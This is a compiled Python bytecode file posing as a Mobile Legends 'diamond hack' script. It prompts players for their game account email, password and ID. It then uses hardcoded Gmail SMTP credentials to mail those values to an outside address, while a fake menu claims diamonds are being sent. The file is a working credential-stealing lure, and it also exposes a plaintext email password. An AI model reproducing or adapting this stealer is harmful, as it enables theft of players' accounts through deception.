o
    �nb|  �                	   @   s�  d dl Z ed� ed� ed� ed� ed� ed�Zed�Zed�Zd dlmZ d d	lm	Z	 eZ
eZd
ZdZdZe� Zeed< eed< e
ed< e�e	ed�� e �dd�Ze��  e�ee� e�� Ze�eee� e��  ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed� ed�Zed� ed� ed� d Zed!k r�ed"d#ed$d%d&ed$� ed!k s�dS dS )'�    N� z([31m-------------------------------[0mz,[36m|     Login Akun Mobile Legend    |[0mz[35m| Email : z| Password : z| ID : )�MIMEMultipart)�MIMETextzgithubfais@gmail.comZgithubfais12345zahmadfaisfauzan1123@gmail.comZFromZToZSubject�textzsmtp.gmail.comiK  z.[0m[32m|       Login Sukses...         |[0mz)[31m--------------------------------[0mz-[31m------------------------------------[0mz-[36m|       SCRIPT HACK DIAMOND ML     |[0mz [32m|  Pilih Nominal Diamond : � z[33m|  1. 12.000 DMz|  2. 35.000 DMz|  3. 55.000 DMz|  4. 70.000 DMz|  5. 80.000 DM[0mz[32mContoh : 12.000 DM[0mz#[35mMasukan Nominal Diamond : [0m�   �
   z[36mzDiamond z[0mz[33mzSedang Dikirim Ke ID : )Zsmtplib�print�inputZnamaZpasZIDZemail.mime.multipartr   Zemail.mime.textr   Zmail_contentZsender_addressZsender_passZreceiver_address�messageZattachZSMTPZsessionZstarttlsZloginZ	as_stringr   Zsendmail�quit�b�i� r   r   �	dmndml.py�<module>   sl    �